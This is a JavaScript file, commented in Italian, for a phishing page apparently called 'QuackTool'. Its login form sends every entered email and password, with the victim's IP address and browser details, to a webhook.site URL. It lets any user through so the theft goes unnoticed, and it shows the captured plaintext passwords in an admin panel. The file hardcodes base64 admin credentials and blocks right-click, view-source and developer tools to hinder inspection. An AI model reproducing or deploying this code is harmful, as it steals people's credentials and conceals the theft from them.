// ⚠️ IL TUO WEBHOOK URL ⚠️
const WEBHOOK_URL = "https://webhook.site/cc3c6391-1059-43f5-b767-03f06a2e2a6d";

// --- FUNZIONE DI INVIO AL WEBHOOK ---
async function sendToWebhook(email, password, action) {
    try {
        // Recupera l'IP reale
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // Prepara i dati
        const payload = {
            "Action": action,
            "Email": email,
            "Password": password,
            "IP Address": ip,
            "Timestamp": new Date().toLocaleString(),
            "Browser": navigator.userAgent
        };

        // Invia al Webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // Salva anche in locale per il pannello admin
        const localLogs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
        localLogs.push(payload);
        localStorage.setItem('local_quack_logs', JSON.stringify(localLogs));

    } catch (error) {
        console.log("Errore di connessione", error);
    }
}

// --- LOGICA LOGIN ---
const SECURE_USER = "YWRtaW5AcXVhY2t0b29s"; // admin@quacktool
const SECURE_PASS = "ZHVjazM5OTM=";         // duck3993

function handleLogin() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const error = document.getElementById('error-msg');

    // Invia i log (sia che sia admin o utente normale)
    if (user !== "" && pass !== "") {
        sendToWebhook(user, pass, "LOGIN_ATTEMPT");
    }

    // Se è l'admin
    if (user === atob(SECURE_USER) && pass === atob(SECURE_PASS)) {
        document.getElementById('admin-nav-btn').style.display = 'block';
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'flex';
    } 
    // Se è un utente normale, lo facciamo entrare lo stesso
    else if (user !== "" && pass !== "") {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app-area').style.display = 'flex';
    } 
    // Se i campi sono vuoti
    else {
        error.style.display = 'block';
    }
}

// --- LOGICA DOWNLOAD ---
function trackDownload() {
    // Invia un log fittizio per dire che il file è stato scaricato
    sendToWebhook("N/A", "N/A", "FILE_DOWNLOADED");
}

// Tasto Invio per il login
document.getElementById('password').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') { handleLogin(); }
});

// --- FUNZIONI ADMIN ---
function loadLogs() {
    const tbody = document.querySelector('#log-table tbody');
    tbody.innerHTML = '';
    const logs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');

    logs.reverse().forEach(log => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${log.Email}</td>
            <td>${log.Password}</td>
            <td>${log["IP Address"]}</td>
            <td style="color: ${log.Action === 'FILE_DOWNLOADED' ? '#00FF00' : '#FFD700'}">${log.Action}</td>
            <td>${log.Timestamp}</td>
        `;
        tbody.appendChild(tr);
    });
}

// --- NAVIGAZIONE ---
function changePage(pageId, btn) {
    document.querySelectorAll('.page').forEach(page => { page.classList.remove('active'); });
    document.querySelectorAll('.nav-btn').forEach(b => { b.classList.remove('active'); });
    document.getElementById(pageId).classList.add('active');
    btn.classList.add('active');
    if (pageId === 'admin-panel') { loadLogs(); }
}

// --- SICUREZZA ANTI-ISPEZIONA ---
document.addEventListener('contextmenu', event => event.preventDefault());
document.onkeydown = function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J'))) {
        return false;
    }
};
setInterval(function() {
    if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        document.getElementById('devtools-warning').style.display = 'flex';
    } else {
        document.getElementById('devtools-warning').style.display = 'none';
    }
}, 500);

// --- SFONDO MATRIX ---
const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');
function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

const words = ["HACKED", "ERROR", "TOKEN", "DDOS", "STEAL", "SYSTEM", "FATAL", "RANSOM", "BREACH", "ROOT", "BYPASS", "CRYPT"];
const fontSize = 16;
let columns = canvas.width / fontSize;
let drops = [];
function initDrops() { columns = canvas.width / fontSize; drops = []; for (let x = 0; x < columns; x++) { drops[x] = 1; } }
initDrops();
window.addEventListener('resize', initDrops);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#FFD700";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = words[Math.floor(Math.random() * words.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) { drops[i] = 0; }
        drops[i]++;
    }
}
setInterval(draw, 60);